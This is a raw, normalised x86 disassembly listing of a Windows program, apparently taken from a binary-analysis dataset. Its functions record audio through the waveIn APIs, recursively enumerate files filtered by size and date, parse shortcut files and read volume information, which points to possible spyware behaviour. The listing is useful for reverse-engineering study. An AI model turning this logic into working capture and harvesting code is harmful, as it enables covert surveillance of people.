sub_401000
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push ebx
push edi
push eax
call [ CharLowerW@IAT ]
movzx eax ax
xor edi edi
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x880 ] edi
jle r-xdata
xor eax eax
lea ebx [ esi + 0x6 ]
inc edi
add ebx 0x44
cmp edi [ esi + 0x880 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push ebx
add eax 0x2
push eax
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
mov ax [ ebp - 0x4 ]
cmp [ ebx - 0x2 ] ax
jne r-xdata
imul edi edi 0x44
mov eax [ edi + esi ]
jmp r-xdata
pop edi
pop ebx
leave
retn 0x4
sub_40105e
test edi edi
je r-xdata
xor al al
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esi + 0x880 ]
cmp eax 0x20
je r-xdata
imul eax eax 0x44
push 0x1f
push [ esp + 0x8 ]
lea eax [ eax + esi + 0x4 ]
push eax
call [ lstrcpynW@IAT ]
test eax eax
mov eax [ esi + 0x880 ]
jne r-xdata
imul eax eax 0x44
lea eax [ eax + esi + 0x4 ]
push eax
call [ CharLowerW@IAT ]
mov eax [ esi + 0x880 ]
imul eax eax 0x44
mov [ eax + esi ] edi
inc [ esi + 0x880 ]
mov al 0x1
jmp r-xdata
imul eax eax 0x44
xor ecx ecx
mov [ eax + esi + 0x4 ] cx
retn 0x4
sub_4010c9
push edi
mov edi [ ebx + 0x884 ]
cmp edi [ ebx + 0x880 ]
jge r-xdata
pop edi
retn
push esi
mov esi edi
imul esi esi 0x44
add esi ebx
push [ esi ]
call [ FreeLibrary@IAT ]
inc edi
add esi 0x44
cmp edi [ ebx + 0x880 ]
jl r-xdata
pop esi
sub_4010f7
mov eax ecx
xor edx edx
push esi
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov esi 0x100
lea ecx [ eax + 0xc ]
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
mov [ eax + 0x10c ] edx
mov [ eax + 0x110 ] edx
mov [ eax + 0x114 ] dl
pop esi
retn
sub_40116c
mov eax sub_41b04b
call sub_416a8c
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_4011b3
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov al [ edi + 0x18 ]
mov [ esi + 0x18 ] al
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4011b3
mov eax sub_41b01f
call sub_416a8c
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_40262f
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_401200
mov eax sub_41b039
call sub_416a8c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
or [ ebp - 0x4 ] 0xffffffff
call sub_4025fd
test [ ebp + 0x8 ] 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push esi
call sub_402678
pop ecx
sub_401238
mov eax sub_41b01f
call sub_416a8c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
or [ ebp - 0x4 ] 0xffffffff
call sub_4025fd
test [ ebp + 0x8 ] 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push esi
call sub_402678
pop ecx
sub_401270
push esi
mov esi [ HeapCreate@IAT ]
push edi
push 0x0
mov edi 0x1000
push edi
push 0x0
call esi
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov al 0x1
push eax
push edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor al al
jmp r-xdata
pop edi
pop esi
retn
sub_4012bf
push ecx
cmp [ esi ] 0x0
je r-xdata
call sub_40f29b
mov eax ebx
call sub_412da8
mov [ esi ] eax
test eax eax
je r-xdata
call sub_40f29b
push [ esi ]
call sub_412d05
xor al al
pop ecx
retn
and [ esi + 0x10 ] 0x0
push 0x20
push esi
mov [ esi + 0x4 ] ebx
push [ edi + 0xc ]
call [ waveInPrepareHeader@IAT ]
push eax
call sub_40b8b1
pop ecx
test al al
jne r-xdata
push 0x20
push esi
push [ edi + 0xc ]
call [ waveInAddBuffer@IAT ]
push eax
call sub_40b8b1
neg al
sbb al al
pop ecx
inc al
pop ecx
retn
sub_401331
push ecx
push edi
mov edi eax
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov ecx [ edi ]
mov [ eax ] ecx
cmp [ edi + 0x4 ] 0x0
jne r-xdata
mov ecx [ edi + 0x4 ]
mov [ eax + 0x4 ] ecx
call sub_4013c3
pop edi
pop ecx
retn 0x4
mov eax [ edi ]
mov ecx [ esp + 0xc ]
mov [ ecx ] eax
sub_401364
mov eax sub_41b071
call sub_416a8c
push ecx
push ecx
call sub_40f29b
push 0x68
pop eax
call sub_412da8
mov [ ebp - 0x10 ] eax
xor edx edx
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] 0x3
mov [ eax + 0xc ] ecx
mov [ eax + 0x64 ] edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ esi ] eax
mov [ fs : 0x0 ] ecx
leave
retn 0x4
mov [ eax ] ecx
mov ecx [ esi ]
mov [ ecx + 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi ]
cmp ecx edx
je r-xdata
sub_4013c3
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
push esi
cmp [ edi + 0x64 ] ebx
je r-xdata
call sub_40f29b
push edi
call sub_412d05
pop esi
mov eax edi
pop ebx
leave
retn
cmp [ edi + 0x60 ] ebx
jbe r-xdata
call sub_40f29b
push [ edi + 0x64 ]
call sub_412d05
mov [ ebp - 0x4 ] ebx
mov esi [ edi + 0x64 ]
add esi [ ebp - 0x4 ]
push 0x20
push esi
push [ edi + 0xc ]
call [ waveInUnprepareHeader@IAT ]
call sub_40f29b
push [ esi ]
call sub_412d05
add [ ebp - 0x4 ] 0x20
inc ebx
cmp ebx [ edi + 0x60 ]
jb r-xdata
sub_401432
push ebp
mov ebp esp
sub esp 0x214
push esi
mov esi eax
push edi
mov ecx 0x210
lea eax [ ebp - 0x214 ]
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x214 ]
push eax
call [ lstrcpyW@IAT ]
mov edi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x214 ]
push eax
call edi
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebp - 0x214 ]
push eax
call edi
mov eax [ esi + 0x20 ]
push 0x58
mov [ ebp - 0xc ] eax
pop eax
add esi 0x4
mov [ ebp - 0x214 ] ax
call sub_40e5c5
mov ecx [ ebp - 0xc ]
and ecx 0xfffffc00
xor edx edx
push 0x3c
mov [ ebp - 0xc ] ecx
pop ecx
div ecx
xor edx edx
push 0x18
div ecx
xor edx edx
pop ecx
div ecx
mov [ ebp - 0x8 ] eax
call sub_40f29b
push 0x210
lea eax [ ebp - 0x214 ]
push eax
call sub_4100a9
pop edi
pop esi
leave
retn
sub_4014d5
push edi
mov edi [ esi ]
call sub_40f29b
push ebx
mov eax esi
call sub_4100dc
mov ecx [ esi + 0x4 ]
shr ecx 0x2
cmp eax ecx
jae r-xdata
mov al 0x1
pop edi
retn
xor ecx ecx
cmp [ edi + eax * 4 ] ebx
setne al
pop edi
retn
sub_4014fd
push edi
xor eax eax
push eax
push eax
push 0x2e
push eax
call [ SHGetFolderPathW@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ PathRemoveFileSpecW@IAT ]
push edi
call esi
push edi
call esi
mov al 0x1
pop esi
retn
xor al al
retn
sub_40154a
push esi
mov esi eax
mov eax [ esi + 0x8 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
mov edi [ CloseHandle@IAT ]
test eax eax
je r-xdata
push eax
call [ UnmapViewOfFile@IAT ]
mov esi [ esi ]
test esi esi
je r-xdata
push eax
call edi
pop edi
pop esi
retn
cmp esi 0xffffffff
je r-xdata
push esi
call edi
sub_40157d
mov eax [ esp + 0x4 ]
mov cx [ eax ]
push esi
push edi
lea edi [ eax + 0x4 ]
lea esi [ ebx + 0x4 ]
mov [ ebx ] cx
call sub_40c94a
mov edi [ esp + 0xc ]
add edi 0x14
lea esi [ ebx + 0x14 ]
call sub_40c94a
pop edi
mov eax ebx
pop esi
retn 0x4
sub_4015aa
push esi
mov esi [ eax + 0x80 ]
test esi esi
je r-xdata
pop esi
retn
push edi
lea edi [ eax + esi * 4 - 0x4 ]
mov eax [ edi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub edi 0x4
dec esi
jne r-xdata
pop edi
sub_4015e6
mov eax sub_41b0cc
call sub_416a8c
sub esp 0xc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x10 ]
shr esi 0x2
mov [ ebp - 0xd ] bl
cmp esi ebx
jle r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp + 0xc ]
call sub_40c938
mov ecx [ ebp - 0xc ]
mov al [ ebp - 0xd ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov edi [ Sleep@IAT ]
mov [ ebp - 0xd ] 0x1
push 0xa
call edi
push 0x0
call edi
inc ebx
cmp ebx esi
jl r-xdata
mov eax [ ebp + 0xc ]
lea eax [ eax + ebx * 4 ]
mov [ ebp - 0x14 ] eax
call sub_40f29b
mov eax [ ebp - 0x14 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_40e7e3
test al al
jne r-xdata
jmp r-xdata
sub_40165e
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x194
push ebx
push esi
xor esi esi
push edi
cmp eax esi
je r-xdata
xor al al
push r--data
push [ ebp + 0x8 ]
mov [ eax ] esi
call sub_40e7e3
test al al
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_40d7b3
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
mov ebx [ ReadFile@IAT ]
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x1c ] esi
test ecx ecx
je r-xdata
cmp [ ebp - 0x88 ] 0x4c
jne r-xdata
push esi
lea ecx [ ebp - 0x1c ]
push ecx
push 0x4c
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call ebx
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
mov al 0x1
jmp r-xdata
push 0x4
pop ecx
mov edi r--data
lea esi [ ebp - 0x84 ]
xor eax eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ ebp - 0x74 ] 0x1
mov esi [ SetFilePointer@IAT ]
je r-xdata
xor edi edi
xor edi edi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] edi
test eax eax
je r-xdata
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x18 ] edi
test eax eax
je r-xdata
movzx eax [ ebp - 0x4 ]
push 0x1
push edi
sub eax 0x2
push eax
push [ ebp - 0x8 ]
call esi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] edi
test eax eax
je r-xdata
push edi
lea eax [ ebp - 0x14 ]
push eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x8 ]
call ebx
mov eax 0x2800
cmp [ ebp - 0x34 ] eax
jae r-xdata
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0x1c
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0x8 ]
call ebx
test [ ebp - 0x74 ] 0x2
je r-xdata
push edi
lea eax [ ebp - 0xc ]
push eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x8 ]
call ebx
jmp r-xdata
cmp [ ebp - 0x38 ] eax
jae r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
mov eax [ ebp - 0x28 ]
push 0x1
push edi
add eax 0xffffffe4
push eax
push [ ebp - 0x8 ]
call esi
mov ecx 0x104
mov edx ecx
lea eax [ ebp - 0x190 ]
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
lea eax [ ebp - 0x190 ]
mov [ ebp - 0x10 ] edi
test eax eax
je r-xdata
lea eax [ ebp - 0x190 ]
push eax
mov [ ebp - 0x8d ] 0x0
call [ lstrlenA@IAT ]
jmp r-xdata
push edi
lea eax [ ebp - 0x10 ]
push eax
push ecx
lea eax [ ebp - 0x190 ]
push eax
push [ ebp - 0x8 ]
call ebx
cmp [ ebp + eax - 0x190 ] 0x5c
jne r-xdata
mov cl [ ebp + eax - 0x190 ]
cmp cl 0x2f
je r-xdata
cmp eax 0x1
jle r-xdata
cmp cl 0x3a
je r-xdata
mov [ ebp + eax - 0x190 ] 0x0
mov esi eax
lea eax [ ebp - 0x190 ]
call sub_40f647
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
cmp eax 0x1
jle r-xdata
dec eax
sub_40183c
mov eax sub_41b124
call sub_416a8c
sub esp 0x20
mov eax [ rw-data ]
push ebx
mov ebx ecx
cmp [ ebx + 0x1c ] 0x0
push esi
push edi
mov [ ebp - 0x14 ] eax
jne r-xdata
xor al al
mov eax [ ebx + 0x20 ]
cmp eax 0x800
jb r-xdata
cmp eax 0x1e00000
ja r-xdata
mov esi [ FileTimeToSystemTime@IAT ]
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebx + 0x4 ]
push eax
call esi
mov edi 0x7dc
mov eax edi
cmp [ ebp - 0x2c ] ax
jb r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebx + 0x14 ]
push eax
call esi
cmp [ ebp - 0x2c ] di
jb r-xdata
sub esp 0x10
mov esi esp
mov edi rw-data
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] esi
call sub_40c9ad
mov [ ebp - 0x4 ] 0x1
lea eax [ ebx + 0x2c ]
push eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4015e6
add esp 0x14
test al al
jne r-xdata
sub esp 0x10
mov esi esp
mov edi rw-data
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] esi
call sub_40c9ad
mov [ ebp - 0x4 ] 0x3
lea eax [ ebx + 0x2c ]
push eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4015e6
add esp 0x14
test al al
je r-xdata
push [ ebp + 0x8 ]
mov eax ebx
call sub_401432
mov edi [ ebp + 0xc ]
mov esi [ Sleep@IAT ]
pop ecx
push 0xa
mov [ edi ] eax
call esi
push 0x0
call esi
push [ edi ]
mov eax rw-data
call sub_4100dc
push 0xa
mov ebx eax
call esi
push 0x0
call esi
mov eax [ ebp - 0x14 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ edi ]
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_401961
push ebp
mov ebp esp
sub esp 0x214
push ebx
mov ebx [ lstrlenW@IAT ]
push esi
push edi
push [ ebp + 0x8 ]
xor esi esi
call ebx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x210 ] ax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] esi
jbe r-xdata
xor eax eax
mov [ ebp + esi * 2 - 0x210 ] ax
lea eax [ ebp - 0x210 ]
push eax
call ebx
test eax eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx + eax * 2 ]
cmp eax 0x3b
jne r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn 0x8
call sub_40f29b
lea edi [ ebp - 0x210 ]
call sub_40e7b9
push eax
push [ ebp + 0xc ]
call sub_40cce2
mov [ ebp + esi * 2 - 0x210 ] ax
inc esi
xor eax eax
mov [ ebp + esi * 2 - 0x210 ] ax
call sub_40f29b
lea edi [ ebp - 0x210 ]
call sub_40e7b9
push eax
push [ ebp + 0xc ]
call sub_40cce2
xor eax eax
mov [ ebp - 0x210 ] ax
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ebp - 0x4 ]
jb r-xdata
sub_401a18
mov eax sub_41b0f8
call sub_416a8c
sub esp 0x1c
mov eax [ ebp + 0x8 ]
add eax 0x30
push ebx
mov ebx ecx
cmp [ ebx + 0x1c ] 0x0
mov [ ebp + 0x8 ] eax
mov eax [ eax ]
push esi
push edi
mov [ ebp - 0x10 ] eax
jne r-xdata
xor al al
mov eax [ ebx + 0x20 ]
cmp eax 0x5000
jb r-xdata
cmp eax 0xa00000
ja r-xdata
mov esi [ FileTimeToSystemTime@IAT ]
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebx + 0x4 ]
push eax
call esi
mov edi 0x7dc
mov eax edi
cmp [ ebp - 0x28 ] ax
jb r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebx + 0x14 ]
push eax
call esi
cmp [ ebp - 0x28 ] di
jb r-xdata
sub esp 0x10
mov esi esp
mov edi rw-data
mov [ ebp - 0x14 ] esp
mov [ ebp - 0x18 ] esi
call sub_40c9ad
mov [ ebp - 0x4 ] 0x1
lea eax [ ebx + 0x2c ]
push eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4015e6
add esp 0x14
test al al
jne r-xdata
sub esp 0x10
mov esi esp
mov edi rw-data
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x14 ] esi
call sub_40c9ad
mov [ ebp - 0x4 ] 0x3
lea eax [ ebx + 0x2c ]
push eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4015e6
add esp 0x14
test al al
je r-xdata
push [ ebp + 0xc ]
mov eax ebx
call sub_401432
mov edi [ ebp + 0x10 ]
mov esi [ Sleep@IAT ]
pop ecx
push 0xa
mov [ edi ] eax
call esi
push 0x0
call esi
call sub_40f29b
push [ edi ]
mov eax [ ebp + 0x8 ]
call sub_4100dc
push 0xa
mov ebx eax
call esi
push 0x0
call esi
mov eax [ ebp - 0x10 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ edi ]
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
sub_401b48
mov eax sub_41b13f
call sub_416a8c
sub esp 0x674
push ebx
push esi
push edi
push [ ebp + 0xc ]
lea eax [ ebp - 0x680 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x680 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x270 ]
push eax
lea eax [ ebp - 0x680 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x10 ] eax
cmp eax 0xffffffff
jne r-xdata
mov esi [ Sleep@IAT ]
push 0xa
call esi
push 0x0
call esi
xor al al
jmp r-xdata
mov edi [ lstrcmpW@IAT ]
push r--data
lea eax [ ebp - 0x244 ]
push eax
call edi
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0xc ]
lea ecx [ ebp - 0x270 ]
push edi
call sub_401a18
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
lea eax [ ebp - 0x270 ]
push eax
push [ ebp - 0x10 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x244 ]
push eax
call edi
test eax eax
je r-xdata
call sub_40f29b
call sub_40e9bf
mov ebx eax
sub eax [ edi ]
cmp eax 0xb4
jbe r-xdata
push 0x0
lea eax [ ebp - 0x270 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
push 0x70941102
push 0x70941101
call sub_40f29b
push eax
call sub_40ded2
test al al
je r-xdata
push 0xa
call esi
push 0x0
call esi
push [ ebp + 0xc ]
lea eax [ ebp - 0x478 ]
push eax
call [ lstrcpyW@IAT ]
mov edi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x478 ]
push eax
call edi
lea eax [ ebp - 0x244 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
call edi
test [ ebp - 0x270 ] 0x10
jne r-xdata
push [ ebp - 0x10 ]
call [ FindClose@IAT ]
mov al 0x1
sub esp 0x10
mov esi esp
mov edi rw-data
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] esi
call sub_40c9ad
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x478 ]
push eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4015e6
add esp 0x14
test al al
jne r-xdata
push 0xa
call esi
push 0x0
call esi
mov ecx [ ebp + 0x10 ]
lea edx [ edi + 0x30 ]
call sub_40c257
mov [ edi ] ebx
jmp r-xdata
call sub_40f29b
mov ebx [ ebp - 0x14 ]
lea eax [ edi + 0x30 ]
call sub_410115
push 0xa
call esi
push 0x0
call esi
mov esi [ Sleep@IAT ]
call sub_40f29b
lea edi [ ebp - 0x478 ]
call sub_40e7b9
push eax
mov eax [ ebp + 0x8 ]
add eax 0x18
push eax
call sub_40cce2
sub_401d39
mov eax sub_41b15c
call sub_416a8c
sub esp 0x27c
push esi
push edi
lea esi [ ebp - 0x24 ]
call sub_40c9fb
xor esi esi
mov [ ebp - 0x4 ] esi
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x4 ]
push esi
push esi
add eax 0x90
push eax
call [ GetVolumeInformationW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
movzx eax [ eax + 0x90 ]
sub eax 0x41
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov edi [ Sleep@IAT ]
lea eax [ ebp - 0x24 ]
lea ecx [ ebp - 0x284 ]
call sub_40c1af
call sub_40f29b
lea eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x24 ]
call sub_410170
lea edi [ ebp - 0x284 ]
call sub_40bea8
lea esi [ ebp - 0x24 ]
call sub_40c90c
xor esi esi
push eax
call sub_40f29b
push eax
mov eax 0x70941101
lea ecx [ ebp - 0x284 ]
call sub_40c11a
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x284 ]
call sub_40c0aa
test al al
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax ]
lea ecx [ ebp - 0x284 ]
push ecx
push [ eax + esi * 4 ]
push ebx
call sub_401b48
mov eax [ ebx + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
lea edx [ ebx + 0x30 ]
lea ecx [ ebp - 0x284 ]
call sub_40c257
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x284 ]
call sub_40bed6
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x24 ]
call sub_40c938
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn
mov ecx [ ebx + 0x28 ]
mov eax [ ebx + 0x2c ]
push ecx
mov [ ebx + 0x2c ] ecx
mov [ ebx + 0x28 ] eax
call sub_40ca1c
push 0xa
call edi
push 0x0
call edi
xor esi esi
jmp r-xdata
push [ ebx + 0x2c ]
call sub_40ca1c
push [ ebx + 0x28 ]
call sub_40ca1c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x4 ]
inc esi
shr eax 0x2
cmp esi eax
jl r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x4 ]
shr eax 0x2
test eax eax
jle r-xdata
jmp r-xdata
sub_401e93
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp [ eax ] 0x0
push esi
push edi
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ ebx + 0x8 ]
call sub_40f29b
mov eax 0xe10
call sub_40ecf5
mov eax [ ebx + 0x4 ]
cmp [ eax ] 0x0
je r-xdata
call sub_40f29b
mov edi [ ebx + 0x4 ]
add edi 0x90
call sub_40e7b9
push eax
push esi
call sub_40cce2
call sub_401d39
mov eax [ ebx + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
sub_401eef
mov eax sub_41b0b0
call sub_416a8c
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
lea esi [ edi + 0x30 ]
call sub_40c938
mov [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x18 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call sub_40c938
or [ ebp - 0x4 ] 0xffffffff
lea esi [ edi + 0x8 ]
mov [ ebp + 0x8 ] esi
or [ ebp - 0x4 ] 0xffffffff
call sub_40c938
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_401f50
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_401fd4 ]
jmp [ ecx * 4 + jump_table_402054 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4020c0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_40225c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_402160 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40225c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4020c0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
